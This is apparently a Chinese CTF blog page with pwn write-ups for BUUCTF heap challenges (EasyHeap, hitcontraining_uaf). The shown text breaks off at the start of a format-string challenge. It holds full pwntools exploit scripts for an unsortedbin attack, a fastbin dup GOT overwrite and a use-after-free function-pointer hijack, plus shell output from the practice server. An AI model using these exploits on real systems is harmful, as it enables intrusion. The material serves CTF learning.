<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="py"><meta name="copyright" content="py"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>buuctf | 我是py</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon/favicon.ico"><link rel="mask-icon" href="/favicon/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"juryorca.github.io","root":"/","title":"宇宙终极无敌猫猫虫大王","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="不做题就去似 做题区这一块 [ZJCTF 2019]EasyHeap--------------------------------       Easy Heap Creator-------------------------------- 1. Create a Heap 2. Edit a Heap 3. Delete a Heap 4. Exit---------------------">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf">
<meta property="og:url" content="http://juryorca.github.io/2025/09/04/buuctf/index.html">
<meta property="og:site_name" content="我是py">
<meta property="og:description" content="不做题就去似 做题区这一块 [ZJCTF 2019]EasyHeap--------------------------------       Easy Heap Creator-------------------------------- 1. Create a Heap 2. Edit a Heap 3. Delete a Heap 4. Exit---------------------">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://juryorca.github.io/2025/09/04/buuctf/joker.png">
<meta property="article:published_time" content="2025-09-04T06:22:26.000Z">
<meta property="article:modified_time" content="2025-10-14T02:13:36.271Z">
<meta property="article:author" content="py">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://juryorca.github.io/2025/09/04/buuctf/joker.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="py"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="py"></a><div class="site-author-name"><a href="/about/">py</a></div><span class="site-name">我是py</span><sub class="site-subtitle">我是py</sub><div class="site-description">无敌奶龙大王cfy & cgxy和无敌疾旋鼬大王dcm</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">6</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Juryorca" title="GitHub" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/i-wanna-41-50" title="知乎" target="_blank" style="color:#0084FF"><span class="icon iconify" data-icon="ri:zhihu-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="都是大佬stO" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-EasyHeap"><span class="toc-number">1.</span> <span class="toc-text">[ZJCTF 2019]EasyHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-uaf"><span class="toc-number">2.</span> <span class="toc-text">hitcontraining_uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-fmt32"><span class="toc-number">3.</span> <span class="toc-text">axb_2019_fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-heapcreator"><span class="toc-number">4.</span> <span class="toc-text">hitcontraining_heapcreator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0ctf-2017-babyheap"><span class="toc-number">5.</span> <span class="toc-text">0ctf_2017_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_n_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui"><span class="toc-number">7.</span> <span class="toc-text">babyfengshui</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stkof"><span class="toc-number">8.</span> <span class="toc-text">stkof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-hacknote"><span class="toc-number">9.</span> <span class="toc-text">pwnable_hacknote</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-easy-equation"><span class="toc-number">10.</span> <span class="toc-text">mrctf2020_easy_equation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-7"><span class="toc-number">11.</span> <span class="toc-text">.&#x2F;ciscn_2019_es_7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019-easy-pwn"><span class="toc-number">12.</span> <span class="toc-text">roarctf_2019_easy_pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#npuctf-2020-easyheap"><span class="toc-number">13.</span> <span class="toc-text">npuctf_2020_easyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-bamboobox"><span class="toc-number">14.</span> <span class="toc-text">hitcontraining bamboobox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF-2019-babyheap"><span class="toc-number">15.</span> <span class="toc-text">ACTF_2019_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-heap"><span class="toc-number">16.</span> <span class="toc-text">axb_2019_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-1"><span class="toc-number">17.</span> <span class="toc-text">ciscn_2019_es_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZCTF-2016-note2"><span class="toc-number">18.</span> <span class="toc-text">ZCTF_2016_note2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-final-3"><span class="toc-number">19.</span> <span class="toc-text">ciscn_final_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-sw-1"><span class="toc-number">20.</span> <span class="toc-text">ciscn_2019_sw_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gyctf-2020-force"><span class="toc-number">21.</span> <span class="toc-text">gyctf_2020_force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootersctf-2019-srop"><span class="toc-number">22.</span> <span class="toc-text">rootersctf_2019_srop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-final-2"><span class="toc-number">23.</span> <span class="toc-text">ciscn_final_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcon-2018-children-tcache"><span class="toc-number">24.</span> <span class="toc-text">hitcon_2018_children_tcache</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gyctf-2020-signin"><span class="toc-number">25.</span> <span class="toc-text">gyctf_2020_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zctf-2016-note3"><span class="toc-number">26.</span> <span class="toc-text">zctf_2016_note3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange-hitcon"><span class="toc-number">27.</span> <span class="toc-text">house_of_orange_hitcon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gyctf"><span class="toc-number">28.</span> <span class="toc-text">gyctf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sctf-2019-easy-heap"><span class="toc-number">29.</span> <span class="toc-text">sctf_2019_easy_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bcloud-bctf-2016"><span class="toc-number">30.</span> <span class="toc-text">bcloud_bctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asis2016-b00ks"><span class="toc-number">31.</span> <span class="toc-text">asis2016_b00ks</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://Juryorca.github.io/2025/09/04/buuctf/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="py"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="我是py"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">buuctf</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-09-04 14:22:26" itemprop="dateCreated datePublished" datetime="2025-09-04T14:22:26+08:00">2025-09-04</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-10-14 10:13:36" itemprop="dateModified" datetime="2025-10-14T10:13:36+08:00">2025-10-14</time></div><div class="post-classify"><span class="post-tag"><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>不做题就去似 做题区这一块</p>
<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--------------------------------</span><br><span class="line">       Easy Heap Creator</span><br><span class="line">--------------------------------</span><br><span class="line"> 1. Create a Heap</span><br><span class="line"> 2. Edit a Heap</span><br><span class="line"> 3. Delete a Heap</span><br><span class="line"> 4. Exit</span><br><span class="line">--------------------------------</span><br></pre></td></tr></table></figure>

<p>create: 一个指针数组 一共可以申请并记录十个chunk<br>edit: 可以往堆里写入任意 存在溢出<br>delete: 正常free 不存在uaf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">        l33t();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要让magic被一个大数覆盖 然后运行4869选项<br>很显然就是打unsortedbin attack<br>程序没有开启pie 这使得我们可以方便的覆盖<br>unsortedbin attack需要覆盖bk指针 bk-&gt;fd 会覆盖成main_arena 这里其实不用在意fd指针是否正确<br>综上 我们我们建立三个0x90大小的chunk<br>然后free掉第二个 用第一个的溢出覆盖bk指针就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leet</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4869&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">2213</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x6020C0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">leet()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果发现远程压根没有&#x2F;home&#x2F;pwn&#x2F;flag文件 只能想其他办法<br>上面的方法没用<br>那么既然我们已经有system.plt地址 可以考虑got表覆盖 通过fastbindup来打<br>打fastbin需要我们拥有一个伪造的chunksize 在got表附近不太现实 一般会考虑在程序管理指针附近的位置伪造,然后控制指针<br>指针前面有IOfile  必然以0x7f结尾 这让我们有了利用的机会</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;:  0x00007fa72edc38e0      0x0000000000000000</span><br><span class="line">0x6020c0 &lt;magic&gt;:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray&gt;:   0x000000002bc70010      0x000000002bc70080</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是说 0x6020b0+8-3的位置开始的话 我们可以获得一个0x7f的long int数<br>那么我们只要利用fastbindup分配到0x6020b0+13的位置就行了 但是要注意fastbin是指向头部的 我们需要控制的指针是0x6020ad</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>))</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6020E0</span>-<span class="number">0x6020bd</span>)+p64(<span class="number">0x0000000000602018</span>))</span><br></pre></td></tr></table></figure>

<p>gdb 检查一下 已经成功覆盖了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:        0x000077302a883a70</span><br></pre></td></tr></table></figure>

<p>然后写入0为system.plt<br>前面create1 的时候改成写入&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leet</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4869&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>))</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6020E0</span>-<span class="number">0x6020bd</span>)+p64(<span class="number">0x0000000000602018</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x400700</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">❯ python exp.py</span><br><span class="line">[+] Starting local process &#x27;./easyheap&#x27;: pid 35286</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">babyheap_0ctf_2017                  easyheap      easyheap.id2  easyheap.zip</span><br><span class="line">babyheap_0ctf_2017:Zone.Identifier  easyheap.id0  easyheap.nam  exp.py</span><br><span class="line">core.24359                          easyheap.id1  easyheap.til</span><br></pre></td></tr></table></figure>

<p>打一下远程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">❯ python exp.py</span><br><span class="line">[+] Opening connection to node5.buuoj.cn on port 26206: Done</span><br><span class="line">ls</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

<h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>

<p>Add:<br>最多五个:<br>由一个8字节的chunk存储一个函数指针和chunk指针 chunk可以任意大小 申请同时需要输入内容<br>一个数组存储这些8字节的信息chunk</p>
<p>del:<br>会把信息chunk和数据chunk都free 但是全都没有归零 有uaf</p>
<p>print:<br>print行为非常抽象 总体来说 他会puts 数据chunk内的内容 然后puts刚才说的函数指针 函数指针里函数就是print_note_content 输出也是通过调用这个函数指针实现的<br>反正总体上来说 我们应该需要控制这个函数指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :0</span><br><span class="line">Success</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :0</span><br><span class="line">*** Error in `./hacknote&#x27;: double free or corruption (fasttop): 0x090b5018 ***</span><br></pre></td></tr></table></figure>

<p>这里的doublefree是系统直接返回的 说明程序在第二次free没进行任何检查 我们利用fastbin的doublefree只检查最顶部的性质来doublefree</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :0</span><br><span class="line">Success</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :1</span><br><span class="line">Success</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :0</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>

<p>但是打fastbin的方法会因为malloc数上限而失败，需要考虑一些更简洁的方法<br>如果我们连续free两次 会有两个0x10大小的fastbin连接 这时候如果我们也申请0x10大小的数据chunk  就可以直接控制第一个被free的信息chunk<br>这样就可以覆盖到指针了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process( <span class="string">&#x27;./hacknote&#x27;</span> )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">48</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">48</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">magic = <span class="number">0x08048945</span></span><br><span class="line">add(<span class="number">8</span>,p32(magic))</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>我一直都不太喜欢格式化字符串的题目 感觉太麻烦 但是考虑到这种题我做的太少了 所以找个标准化的练习一下<br>首先是要获得参数列表起始位置到格式化字符串的位置的偏移<br>可以用gdb查看地址然后计算 也可以直接盲打 这里都演示一遍</p>
<p>gdb查看地址:<br>下断点到printf(format) 的call printf之前 这里已经push了一个参数 也就是说 esp 指向的就是参数列表的开头</p>
